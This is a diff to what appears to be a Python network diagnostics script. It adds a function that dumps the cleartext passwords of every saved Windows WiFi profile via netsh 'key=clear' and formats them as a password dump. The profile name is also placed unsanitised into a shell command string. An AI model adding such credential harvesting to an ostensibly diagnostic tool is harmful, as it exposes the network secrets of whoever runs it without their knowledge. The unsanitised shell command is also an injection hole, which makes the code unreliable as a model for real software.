@@ -248,8 +248,40 @@ def get_routing_table():
 def get_wifi_info():
     """Returns WiFi interface details and saved profiles."""
     if platform.system().lower() == "windows":
-        return run_system_command("netsh wlan show interfaces && netsh wlan show profiles")
+        return run_system_command("netsh wlan show interfaces")
     return "WiFi diagnostics only supported on Windows."
+
+def get_wifi_passwords():
+    """Attempts to retrieve passwords for all saved WiFi profiles."""
+    if platform.system().lower() != "windows":
+        return "WiFi password recovery only supported on Windows."
+    
+    try:
+        # Get list of profiles
+        profiles_output = run_system_command("netsh wlan show profiles")
+        profiles = []
+        for line in profiles_output.split('\n'):
+            if "All User Profile" in line:
+                profile_name = line.split(":")[1].strip()
+                profiles.append(profile_name)
+        
+        if not profiles:
+            return "No WiFi profiles found."
+        
+        results = ":: WIFI_PASSWORD_DUMP ::\n"
+        results += "-----------------------\n"
+        for name in profiles:
+            detail = run_system_command(f'netsh wlan show profile name="{name}" key=clear')
+            password = "NO_PASSWORD_OR_OPEN"
+            for d_line in detail.split('\n'):
+                if "Key Content" in d_line:
+                    password = d_line.split(":")[1].strip()
+                    break
+            results += f"SSID: {name:<25} | PASS: {password}\n"
+        
+        return results
+    except Exception as e:
+        return f"Error recovering passwords: {str(e)}"
 
 def get_nbtstat():
     """Returns NetBIOS statistics."""
